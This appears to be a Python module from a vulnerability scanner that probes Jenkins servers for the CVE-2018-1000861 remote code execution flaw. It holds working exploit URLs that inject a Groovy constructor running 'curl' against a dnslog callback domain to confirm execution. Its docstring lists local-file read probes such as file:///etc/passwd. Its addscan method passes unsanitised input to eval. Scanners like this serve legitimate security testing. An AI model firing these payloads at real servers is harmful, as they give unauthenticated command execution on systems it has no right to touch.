#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
    Jenkins扫描类: 
        jenkins 远程命令执行
            CVE-2018-1000861
file:///etc/passwd
file:///C:\Windows\System32\drivers\etc\hosts
file:///C:/Windows/System32/drivers/etc/hosts
'''

from lib.api.dns import dns
from lib.initial.config import config
from lib.tool.md5 import md5, random_md5
from lib.tool.logger import logger
from lib.tool.thread import thread
from lib.tool import check
from lib.tool import head
from thirdparty import requests
from time import sleep

class Jenkins():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'Jenkins'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md

        self.cve_2018_1000861_payloads = [
            {
                'path': 'securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=public class x {public x(){"curl dnsdomain".execute()}}',
                'data': ''
            },
            {
                'path': 'user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=public class x {public x(){"curl dnsdomain".execute()}}',
                'data': ''
            },
            {
                'path': 'admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=public class x {public x(){"curl dnsdomain".execute()}}',
                'data': ''
            },
            {
                'path': 'descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=public class x {public x(){"curl dnsdomain".execute()}}',
                'data': ''
            }
        ]

    def cve_2018_1000861_scan(self, url):
        '''  '''
        sessid = 'ae9b030320374b97c35d76dfbe5c5eb6'

        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'RCE'
        vul_info['vul_id'] = 'CVE-2018-1000861'
        vul_info['vul_method'] = 'GET'
        vul_info['headers'] = {}

        headers = self.headers.copy()
        headers.update(vul_info['headers'])

        for payload in self.cve_2018_1000861_payloads:
            md = random_md5()                                       # * 随机md5值, 8位
            dns_domain = md + '.' + dns.domain(sessid)              # * dnslog/ceye域名

            path = payload['path'].replace('dnsdomain', dns_domain) # * Path
            data = payload['data']                                  # * Data
            target = url + path

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                res = requests.get(
                    target, 
                    timeout=self.timeout, 
                    headers=headers,
                    data=data, 
                    proxies=self.proxies, 
                    verify=False
                )
                logger.logging(vul_info, res.status_code, res)                        # * LOG
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            sleep(2)
            if (md in dns.result(md, sessid)):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Method': vul_info['vul_method'],
                    'Payload': {
                        'Url': url,
                        'Path': path
                    }
                }
                return results

    def addscan(self, url, vuln=None):
        if vuln:
            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))

        return [
            thread(target=self.cve_2018_1000861_scan, url=url)
        ]

jenkins = Jenkins()
